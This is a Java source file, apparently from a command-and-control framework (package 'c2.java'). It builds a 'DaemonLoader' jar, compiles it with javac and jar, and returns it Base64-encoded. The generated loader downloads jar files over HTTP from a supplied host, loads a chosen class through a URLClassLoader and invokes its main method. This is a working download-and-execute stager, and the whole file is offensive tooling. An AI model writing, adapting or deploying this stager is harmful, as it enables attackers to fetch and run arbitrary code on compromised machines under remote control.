package c2.java;

import java.io.IOException;
import java.nio.file.Files;
import java.nio.file.Path;
import java.nio.file.Paths;
import java.util.Base64;
import java.util.List;
import java.util.concurrent.TimeUnit;

public class DaemonLoaderGenerator {

	public static final Path TEMPORARY_DISK_SRC_FILE = Paths.get("DaemonLoader.java");
	public static final Path TEMPORARY_DISK_CLASS_FILE = Paths.get("DaemonLoader.class");
	public static final Path TEMPORARY_DISK_EXE_FILE = Paths.get("DaemonLoader.jar");

	public static String generateDaemonLoaderB64Exe(String targetHost, List<String> jarFiles, String mainMethod) throws IOException {
		String fileText = generateDaemonLoaderString(targetHost, jarFiles, mainMethod);
		
		Files.writeString(TEMPORARY_DISK_SRC_FILE, fileText);
		String commands[] = {"javac " + TEMPORARY_DISK_SRC_FILE, "jar -cvf " + TEMPORARY_DISK_EXE_FILE + " " + TEMPORARY_DISK_CLASS_FILE};
		for(String command : commands) {
		Process process = Runtime.getRuntime().exec(command);
		try {
			if(!process.waitFor(30, TimeUnit.SECONDS)) {
				int availErrors = process.getErrorStream().available();
				if(availErrors > 0) {
					System.out.print("stderr: " + new String(process.getErrorStream().readNBytes(availErrors)));
				}
				int availOp = process.getInputStream().available();
				if(availOp > 0) {
					System.out.print("stdout: " + new String(process.getInputStream().readNBytes(availOp)));
				}
				
				throw new IOException("Unable to generate exe! This happens sometimes with the underlying system being not ready, try again and resubmit");	
			}
		} catch (InterruptedException e) {
			
		}
		}
		String b64 = Base64.getEncoder().encodeToString(Files.readAllBytes(TEMPORARY_DISK_EXE_FILE));

		Files.delete(TEMPORARY_DISK_SRC_FILE);
		Files.delete(TEMPORARY_DISK_EXE_FILE);
		Files.delete(TEMPORARY_DISK_CLASS_FILE);
		
		return b64;
	}
	
	public static String generateDaemonLoaderString(String targetHost, List<String> jarFiles, String mainMethod) {
		StringBuilder sb = new StringBuilder();
		//sb.append("package c2.daemon;"); sb.append(System.lineSeparator());
		sb.append("import java.io.IOException;"); sb.append(System.lineSeparator());
		sb.append("import java.lang.reflect.Method;"); sb.append(System.lineSeparator());
		sb.append("import java.lang.reflect.InvocationTargetException;"); sb.append(System.lineSeparator());
		sb.append("import java.net.MalformedURLException;"); sb.append(System.lineSeparator());
		sb.append("import java.net.URL;"); sb.append(System.lineSeparator());
		sb.append("import java.net.URLClassLoader;"); sb.append(System.lineSeparator());

		sb.append("public class DaemonLoader {"); sb.append(System.lineSeparator());
		
		sb.append("public static void main(String args[]) {"); sb.append(System.lineSeparator());
		sb.append("try {"); sb.append(System.lineSeparator());
		
		StringBuilder builderUrlList = new StringBuilder();
		for(int i = 0; i < jarFiles.size(); i++) {
			sb.append("URL url" + i + " = new URL(\"http://" + targetHost + "/" + jarFiles.get(i) + "\");"); sb.append(System.lineSeparator());
			if(i == 0) {
				builderUrlList.append("url0");
			}else {
				builderUrlList.append(", url" + i);
			}
		}
		sb.append("URLClassLoader classLoader = new URLClassLoader(new URL[] { " + builderUrlList.toString() + " });"); sb.append(System.lineSeparator());
		sb.append("Class<?> clz = classLoader.loadClass(\"" + mainMethod +"\");"); sb.append(System.lineSeparator());
		sb.append("Method m = clz.getMethod(\"main\", String[].class);"); sb.append(System.lineSeparator());
		sb.append("String[] params = null;"); sb.append(System.lineSeparator());
		sb.append("m.invoke(null, (Object) params);"); sb.append(System.lineSeparator());
		sb.append("classLoader.close();"); sb.append(System.lineSeparator());
		
		
		sb.append("} catch (Exception e) {"); sb.append(System.lineSeparator());
		sb.append("e.printStackTrace();"); sb.append(System.lineSeparator());
		sb.append("}"); sb.append(System.lineSeparator());
		sb.append("}"); sb.append(System.lineSeparator());
		sb.append("}"); sb.append(System.lineSeparator());
		return sb.toString();
	}
}
